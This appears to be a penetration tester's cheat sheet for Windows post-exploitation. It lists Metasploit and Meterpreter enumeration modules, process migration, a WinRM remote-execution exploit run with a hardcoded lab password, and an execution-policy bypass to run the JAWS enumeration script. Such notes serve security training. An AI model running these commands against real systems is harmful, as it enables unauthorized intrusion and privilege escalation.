# Post Exploitation

- Metasploit
    
    ```powershell
    Modules
    use post/windows/gather/win_privs
    set session 1
    run
    
    use post/windows/gather/enum_logged_on_users
    set session 
    run
    
    use post/windows/gather/checkvm
    set session 1
    run
    
    use post/windows/gather/enum_applications
    set session 1
    run
    
    use post/windows/gather/enum_av_excluded
    set session 1
    run
    
    use post/windows/gather/enum_computers
    set session 1
    run
    
    use post/windows/gather/enum_shares
    set session 1
    run
    
    use post/windows/gather/enum_patches
    set session 1
    run
    
    Meterpreter
    getuid
    getprivs
    background
    
    use post/windows/gather/enum_logged_on_users
    set SESSION 1
    run
    
    ```
    
- User info
    
    ```powershell
    shell 
    systeminfo
    hostname
    wmic qfe get Caption,Description,HotFixID,InstalledOn
    whoami /priv
    
    User & Group Enumeration
    net users
    net user administrator
    net localgroup
    net localgroup administrators
    ```
    
- Network Information
    
    ```powershell
    ipconfig /all
    route print
    arp -a
    netstat -ano
    ```
    
- Processes and services
    
    ```powershell
    Meterpreter
    ps
    pgrep explorer.exe
    migrate 2176
    
    Shell
    net start
    wmic service list brief
    tasklist /SVC
    schtasks /query /fo LIST
    netsh firewall show state
    netsh advfirewall
    netsh advfirewall firewall 
    netsh advfirewall firewall help
    netsh advfirewall firewall dump
    netsh advfirewall firewall show
    show_mount
    ```
    
- Automating
    
    ```powershell
    msfconsole
    use exploit/windows/winrm/winrm_script_exec
    set RHOSTS 10.2.21.181
    set USERNAME administrator
    set PASSWORD tinkerbell
    set FORCE_VBS true
    run
    background
    https://github.com/411Hall/JAWS
    ```
    
- JAWS
    
    ```bash
    cd C:\\
    mkdir Temp
    cd Temp
    upload /root/Desktop/jaws-enum.ps1
    shell
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    download JAWS-Enum.txt
    ```
    

Outros Recursos 

[PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)

[RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)

[Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)

[Decoder's Blog](https://decoder.cloud/)

[Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)

[Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)